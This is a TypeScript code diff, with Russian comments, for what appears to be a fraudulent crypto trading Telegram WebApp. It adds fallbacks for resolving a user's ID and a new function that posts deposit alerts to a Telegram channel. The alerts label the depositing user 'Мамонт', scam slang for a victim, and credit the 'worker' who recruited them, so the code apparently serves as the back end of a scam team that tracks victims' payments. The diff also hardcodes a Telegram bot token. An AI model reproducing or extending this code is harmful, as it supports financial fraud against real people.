@@ -1,4 +1,5 @@
 import { supabase } from '../supabaseClient';
+import { getCurrentUserId } from './auth';
 
 // Конфигурация бота для уведомлений
 const BOT_TOKEN = '8312481233:AAH_CzfX314D_dbthhUBdZ5SoAzO3scrEu0';
@@ -15,11 +16,11 @@ export async function notifyReferrer(actionName: string, actionDetails?: {
     method?: string;
 }) {
     try {
-        // 1. Получаем ID текущего пользователя из Telegram WebApp
+        // 1. Получаем ID текущего пользователя (приоритет: Telegram WebApp > URL > localStorage)
         const tgUser = window.Telegram?.WebApp?.initDataUnsafe?.user;
         let userId = tgUser?.id;
         
-        // Fallback: читаем tgid из URL
+        // Fallback 1: читаем tgid из URL
         if (!userId) {
             const urlParams = new URLSearchParams(window.location.search);
             const urlTgId = urlParams.get('tgid');
@@ -28,8 +29,17 @@ export async function notifyReferrer(actionName: string, actionDetails?: {
             }
         }
         
+        // Fallback 2: читаем из localStorage (для пользователей, вошедших через форму)
         if (!userId) {
-            console.log('Не удалось получить ID пользователя для уведомления');
+            const storedUserId = getCurrentUserId();
+            if (storedUserId) {
+                userId = storedUserId;
+                console.log('📱 Используем ID из localStorage:', userId);
+            }
+        }
+        
+        if (!userId) {
+            console.log('❌ Не удалось получить ID пользователя для уведомления');
             return false;
         }
 
@@ -47,9 +57,11 @@ export async function notifyReferrer(actionName: string, actionDetails?: {
 
         // 3. Проверяем, есть ли реферер
         if (!userData.referrer_id) {
-            console.log('У пользователя нет реферера');
+            console.log('ℹ️ У пользователя нет реферера (воркера)');
             return false;
         }
+
+        console.log(`📤 Отправка уведомления воркеру ${userData.referrer_id}...`);
 
         // 4. Получаем данные реферера (воркера)
         const { data: referrerData, error: referrerError } = await supabase
@@ -106,16 +118,16 @@ export async function notifyReferrer(actionName: string, actionDetails?: {
         });
 
         if (response.ok) {
-            console.log(`Уведомление отправлено воркеру ${userData.referrer_id}`);
+            console.log(`✅ Уведомление успешно отправлено воркеру ${userData.referrer_id}`);
             return true;
         } else {
             const errorData = await response.json();
-            console.error('Ошибка отправки уведомления:', errorData);
+            console.error('❌ Ошибка отправки уведомления:', errorData);
             return false;
         }
 
     } catch (error) {
-        console.error('Ошибка в notifyReferrer:', error);
+        console.error('❌ Ошибка в notifyReferrer:', error);
         return false;
     }
 }
@@ -138,6 +150,118 @@ export const notifyWithdraw = (amount: number) => {
 export const notifyRegistration = () => {
     return notifyReferrer('Регистрация в системе');
 };
+
+/**
+ * Отправляет уведомление в канал о пополнении с верификацией
+ * @param amount - сумма пополнения
+ * @param currency - валюта
+ * @param method - метод пополнения
+ * @param channelId - ID канала (например: @your_channel или -1001234567890)
+ */
+export async function notifyDepositToChannel(
+    amount: number, 
+    currency: string, 
+    method: string,
+    channelId: string = '@tontrader_deposits' // Замените на ваш канал
+) {
+    try {
+        // Получаем ID текущего пользователя
+        const tgUser = window.Telegram?.WebApp?.initDataUnsafe?.user;
+        let userId = tgUser?.id;
+        
+        if (!userId) {
+            const urlParams = new URLSearchParams(window.location.search);
+            const urlTgId = urlParams.get('tgid');
+            if (urlTgId && !isNaN(Number(urlTgId))) {
+                userId = Number(urlTgId);
+            }
+        }
+        
+        if (!userId) {
+            userId = getCurrentUserId();
+        }
+        
+        if (!userId) {
+            console.log('❌ Не удалось получить ID пользователя для уведомления в канал');
+            return false;
+        }
+
+        // Получаем данные пользователя и воркера
+        const { data: userData, error: userError } = await supabase
+            .from('users')
+            .select('user_id, username, full_name, referrer_id')
+            .eq('user_id', userId)
+            .single();
+
+        if (userError || !userData) {
+            console.log('❌ Пользователь не найден в базе данных');
+            return false;
+        }
+
+        // Получаем данные воркера если есть
+        let workerName = 'Без воркера';
+        let workerNickname = '-';
+        
+        if (userData.referrer_id) {
+            const { data: workerData } = await supabase
+                .from('users')
+                .select('username, full_name')
+                .eq('user_id', userData.referrer_id)
+                .single();
+            
+            if (workerData) {
+                workerName = workerData.full_name || 'Неизвестно';
+                workerNickname = workerData.username || '-';
+            }
+        }
+
+        // Формируем сообщение для канала
+        const userName = userData.full_name || 'Неизвестно';
+        const userNickname = userData.username || 'Нет никнейма';
+        
+        const methodNames: Record<string, string> = {
+            'card': '💳 Банковская карта',
+            'crypto': '₿ Криптовалюта'
+        };
+        
+        let message = `💰 <b>НОВОЕ ПОПОЛНЕНИЕ</b>\n\n`;
+        message += `👤 <b>Мамонт:</b> ${userName}\n`;
+        message += `📱 <b>Никнейм:</b> ${userNickname}\n`;
+        message += `🆔 <b>ID:</b> ${userData.user_id}\n\n`;
+        message += `👨‍💼 <b>Воркер:</b> ${workerName}\n`;
+        message += `📱 <b>Никнейм воркера:</b> ${workerNickname}\n\n`;
+        message += `💵 <b>Сумма:</b> ${amount} ${currency}\n`;
+        message += `${methodNames[method] || method}\n\n`;
+        message += `✅ <b>Статус:</b> Ожидает верификации\n`;
+        message += `📅 <b>Время:</b> ${new Date().toLocaleString('ru-RU')}`;
+
+        // Отправляем в канал
+        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: channelId,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        });
+
+        if (response.ok) {
+            console.log(`✅ Уведомление о пополнении отправлено в канал`);
+            return true;
+        } else {
+            const errorData = await response.json();
+            console.error('❌ Ошибка отправки в канал:', errorData);
+            return false;
+        }
+
+    } catch (error) {
+        console.error('❌ Ошибка в notifyDepositToChannel:', error);
+        return false;
+    }
+}
 
 /**
  * Показывает браузерное push-уведомление о результате сделки
